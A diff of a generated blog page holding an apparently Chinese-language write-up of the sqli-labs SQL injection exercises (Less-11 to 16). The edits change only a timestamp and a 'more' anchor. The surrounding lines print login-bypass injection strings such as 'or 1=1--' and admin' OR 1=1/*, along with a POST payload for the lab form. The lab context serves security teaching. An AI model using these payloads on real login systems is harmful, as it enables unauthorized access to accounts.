@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Ahodor&#39;Via">
 <meta property="og:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-07-27T02:57:02.321Z">
+<meta property="og:updated_time" content="2018-07-27T03:09:11.511Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs-Less-11-16">
 <meta name="twitter:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
@@ -389,7 +389,7 @@ jsp 万能密码
 admin&apos; OR 1=1/*
 用户名：admin 系统存在这个用户的时候 才用得上
 密码：1&apos;or&apos;1&apos;=&apos;1
-</code></pre><p>&lt; !–more–&gt;</p>
+</code></pre><a id="more"></a>
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h3 id="（1）万能密码"><a href="#（1）万能密码" class="headerlink" title="（1）万能密码"></a>（1）万能密码</h3><p>在passwd字段后面构造<strong>万能密码+闭合单引号</strong></p>
 <pre><code>uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit
 返回
